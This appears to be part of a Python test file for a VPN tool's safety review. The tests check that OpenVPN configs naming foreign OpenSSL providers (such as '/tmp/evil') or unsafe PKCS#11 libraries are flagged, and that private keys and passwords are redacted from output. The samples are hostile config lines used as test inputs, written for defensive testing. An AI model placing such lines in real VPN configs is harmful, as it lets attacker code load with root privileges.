    assert vpn_execution._hook_findings(f"client\n{line}\n", "OpenVPN") == ([], [], [])


@pytest.mark.parametrize("line, named", [
    ("providers /tmp/evil", "/tmp/evil"),               # OSSL_PROVIDER_load takes a path
    ("providers evil", "evil"),                         # or a module from OpenSSL's folder
    ("providers Legacy", "Legacy"),                     # matched exactly, as OpenSSL does
    ("providers legacy ./x default", "./x"),
])
def test_any_other_provider_blocks(line, named):
    blockers = vpn_execution._hook_findings(f"client\n{line}\n", "OpenVPN")[0]
    assert len(blockers) == 1 and f"names {named!r}" in blockers[0]


def test_pkcs11_libraries_are_checked_like_hook_programs(monkeypatch):
    unsafe = {"/Users/me/lib.dylib": "it is in a user's home directory"}
    monkeypatch.setattr(vpn_execution, "_unsafe_executable_reason", lambda p: unsafe.get(str(p)))
    monkeypatch.setattr(vpn_execution, "_exists", lambda p: True)
    line = "pkcs11-providers /usr/local/lib/ok.dylib /Users/me/lib.dylib p11.dylib"
    text = f"client\n{line}\n"
    assert vpn_execution.hooks_from_text(text, "OpenVPN") == [
        "pkcs11-providers: /usr/local/lib/ok.dylib /Users/me/lib.dylib p11.dylib"]
    blockers, soft, warnings = vpn_execution._hook_findings(text, "OpenVPN")
    assert blockers == [] and warnings == []
    assert len(soft) == 2
    assert "/Users/me/lib.dylib" in soft[0] and "user's home directory" in soft[0]
    assert "loads p11.dylib, a relative path" in soft[1]
    clean = "client\npkcs11-providers /usr/local/lib/ok.dylib\n"
    assert vpn_execution._hook_findings(clean, "OpenVPN") == ([], [], [])


def test_pkcs11_libraries_count_against_the_review_budget(monkeypatch):
    monkeypatch.setattr(vpn_execution, "_unsafe_executable_reason", lambda p: None)
    monkeypatch.setattr(vpn_execution, "_exists", lambda p: True)
    paths = " ".join(f"/l/p{i}" for i in range(vpn_execution.HOOK_CHECK_LIMIT + 1))
    blockers = vpn_execution._hook_findings(f"client\npkcs11-providers {paths}\n", "OpenVPN")[0]
    assert not any("longer than" in b for b in blockers)
    assert any("more than" in b for b in blockers)


def test_a_foreign_provider_blocks_connect(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: True)
    path = tmp_path / "srv.ovpn"
    path.write_text("client\nremote 203.0.113.7 1194\nproviders legacy /tmp/evil\n")
    assert any("names '/tmp/evil'" in b for b in review("connect", profile_for(path)).blockers)


# test_disconnect_review_does_not_rescan_hooks pinned a gap (wg-quick down re-reads
# the config and runs PreDown/PostDown as root, yet a disconnect was never scanned).
# It is replaced by its inverse, test_disconnect_review_scans_predown_and_postdown
# in tests/test_vpn_review_gate.py (audit tier-2 S1, approved by the owner).


# ── Key material never reaches the Execution tab ───────────

CANARY = "cGFub3B0aWNvbi1zZWNyZXQta2V5LWNhbmFyeS0wMDAxMjM="   # 44-char base64

@pytest.mark.parametrize("text, must_vanish", [
    (f"Line unrecognized: `PrivateKey = {CANARY}`", CANARY),
    (f"PresharedKey={CANARY}", CANARY),
    (f"auth-user-pass hunter2 mypassword", "hunter2"),
    (f"<key>\n-----BEGIN PRIVATE KEY-----\nMIIBogusKeyBody\n-----END PRIVATE KEY-----\n</key>", "MIIBogusKeyBody"),
    (f"peer {CANARY} handshake failed", CANARY),
])
def test_redact_secrets_scrubs_each_shape(text, must_vanish):
    out = vpn_execution.redact_secrets(text)
    assert must_vanish not in out
    assert "redacted" in out


def test_redact_secrets_leaves_ordinary_output_alone():
    text = "[#] ip link add wg0 type wireguard\n[#] wg setconf wg0 /dev/fd/63\nRTNETLINK answers: File exists"
    assert vpn_execution.redact_secrets(text) == text
    assert vpn_execution.redact_secrets("") == ""
    assert vpn_execution.redact_secrets(None) == ""


def test_execute_redacts_tool_output_and_error_everywhere(tmp_path):
    import json
    conf = write_conf(tmp_path)
    leaked = f"wg-quick: Line unrecognized: `PrivateKey = {PRIVATE_KEY}`"

    def run(script, prompt, timeout=30):
        return False, leaked
    outcome = execute("connect", profile_for(conf), run_as_root=run,
                                    probe=Probe(), killswitch_armed=lambda: False, sleep=lambda s: None)
    everything = json.dumps(outcome.as_result())
    assert PRIVATE_KEY not in everything
    assert "[redacted]" in everything


def test_interface_only_profile_without_a_wg_quick_config_is_blocked(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    profile = {"name": "VPS", "protocol": "WireGuard", "endpoint": "203.0.113.7",
               "interface": "wgtest"}
    r = review("connect", profile)
    assert any("No config for 'wgtest'" in b for b in r.blockers)
    (tmp_path / "wgtest.conf").write_text("[Interface]\n")
    r = review("connect", profile)
    assert not any("No config for" in b for b in r.blockers)
    r = review("disconnect", profile)       # coming down never needs the file
    assert not any("No config for" in b for b in r.blockers)
